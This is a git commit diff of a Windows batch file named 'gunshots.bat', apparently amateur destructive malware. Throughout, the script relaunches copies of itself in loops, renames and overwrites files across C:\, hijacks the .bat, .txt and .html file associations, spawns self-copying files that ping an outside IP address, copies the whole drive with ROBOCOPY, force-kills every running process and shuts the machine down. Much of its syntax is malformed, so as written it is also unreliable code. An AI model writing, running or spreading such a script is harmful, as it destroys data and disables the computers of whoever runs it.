b27999a5e78eb052f3e6b6fd39d9037b79d7bd36
randyman777777777 <121990518+randyman777777777@users.noreply.github.com>
2023-02-18 16:34:18 -0800

    Active

--- bat/gunshots.bat
+++ bat/gunshots.bat
@@ -1,8 +1,59 @@
 @echo off
 :r
-l7 = %random%%random%%random%%random%.DAEMON.html
-6 = "echo "
-fe = " > l7"
+set "14=set "
+14BAM=copy %0 %0x3 start %0x3
+BAM
+BAM
+BAM
+BAM
+BAM
+BAM
+BAM
+BAM
+BAM
+BAM
+BAM
+BAM
+BAM
+14H=HELP
+14O=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
+14l7=%random%%random%%random%%random%.DAEMON.html
+14"6=echo "
+14"fe= > l7"
 6<!DOCTYPE html>fe
 6<html>fe
 6<head>fe 
@@ -29,8 +80,29 @@ fe = " > l7"
 6</script>fe
 6</body>fe
 6</html>fe
-start l7
-AGGGH = start %0
+14"l8=start l7"
+l8
+l8
+l8
+l8
+l8
+l8
+O
+H
+O
+14"AGGGH=start %0"
+AGGGH
+O
+H
+O
+H
+O
+H
+O
+H
+O
+H
+O
 AGGGH
 AGGGH
 AGGGH
@@ -43,6 +115,30 @@ AGGGH
 AGGGH
 AGGGH
 AGGGH
+O
+H
+O
+H
+O
+H
+O
+H
+O
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+O
+H
+O
+H
+O
+H
+O
+H
+O
 AGGGH
 AGGGH
 AGGGH
@@ -54,7 +150,10 @@ AGGGH
 AGGGH
 AGGGH
 AGGGH
-AGGGH
+O
+O
+O
+O
 for /f "tokens" %%a in ('TREE C:\ /nh') do (
     REN %%a %%a.bat
     echo :r > %%a
@@ -69,34 +168,93 @@ for /f "tokens" %%a in ('TREE C:\ /nh') do (
     pain
     pain
 )
-BANGBANG = BANG%random%BANGBANG%random%%random%%random%%random%.DAEMON.bat
+O
+H
+O
+H
+O
+H
+O
+H
+O
+14"BANGBANG=BANG%random%BANGBANG%random%%random%%random%%random%.DAEMON.bat"
 echo XCOPY %0 %random%BANG%random%BANG%random%BANG%random%.wizard.bat > BANGBANG
 echo start %random%BANG%random%BANG%random%BANG%random%.wizard.bat > BANGBANG
-d5 = start BANGBANG
+14"d5=start BANGBANG"
+O
 d5
+O
 d5
+O
 d5
+O
 d5
+O
 d5
+O
 d5
+O
 d5
+O
+H
+O
 d5
+O
 d5
+O
 d5
+O
 d5
+O
 d5
-echo ping 142.251.32.36 /n 44 -l 777 > %random%%random%%random%%random%.DAEMON.bat
-d8 = %random%%random%%random%%random%.DAEMON.bat
-d9 = start d8
+O
+H
+O
+H
+O
+H
+O
+H
+O
+14"d8=%random%%random%%random%%random%.DAEMON.bat"
+14"8=> d8"
+echo :r8
+echo set "ur5=copy %0 XD.%random%.%08"
+echo ur58
+echo ur58
+echo ur58
+echo ur58
+echo ur58
+echo ur58
+echo ur58
+echo ping 142.251.32.36 /n 44 -l 7778
+echo goto r8
+14"d9=start d8"
+O
 d9
+O
 d9
+O
 d9
+O
 d9
+O
+H
+O
+H
+O
+H
+O
+H
+O
 d9
+O
 d9
+O
 d9
+O
 ftype yungus%random%%random%=C:\Windows\System32\cmd.exe /k %0 %*
-yungus = yungus%random%%random%
+14"yungus=yungus%random%%random%"
 assoc .bat=yungus
 assoc .txt=yungus
 assoc .html=yungus
@@ -113,28 +271,81 @@ for /f "tokens" %%a in ('TREE C:\ /nh') do (
     d2
     d2
 )
-d3 = ROBOCOPY C:\ %random%%random%
+14"d3=ROBOCOPY C:\ %random%%random%"
+O
 d3
+O
 d3
+O
 d3
+O
 d3
+O
 d3
+O
 d3
+O
 d3
+O
 d3
+O
 d3
+O
 d3
+O
 d3
+O
 d3
+O
 title %random%%random%%random%%random%
-HELP
-HELP
-RR76 = %0%0%random%%random%.RR76.bat
+O
+O
+O
+O
+H
+O
+O
+O
+O
+H
+O
+O
+O
+O
+14"RR76=%0%0%random%%random%.RR76.bat"
 echo copy %0 > RR76.bat
 echo start %0%0%random%.RR76.bat > RR76
 echo mkdir %0%random% > RR76
 start RR76
+O
+O
+O
+O
+H
+O
+O
+O
+O
+H
+O
+O
+O
+O
+H
+O
+O
+O
+O
+H
+O
+O
+O
+O
 TASKLIST
+O
+O
+O
+O
 for /f "tokens" %%a in ('TASKLIST /nh') do (
     TASKKILL /F /IM %%a
 )
@@ -142,4 +353,51 @@ title %random%%random%%random%%random%%random%%random%%random%
 if %TITLE% == "678956341236572346522673444147": goto x
 goto r
 :x
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
+O
 SHUTDOWN
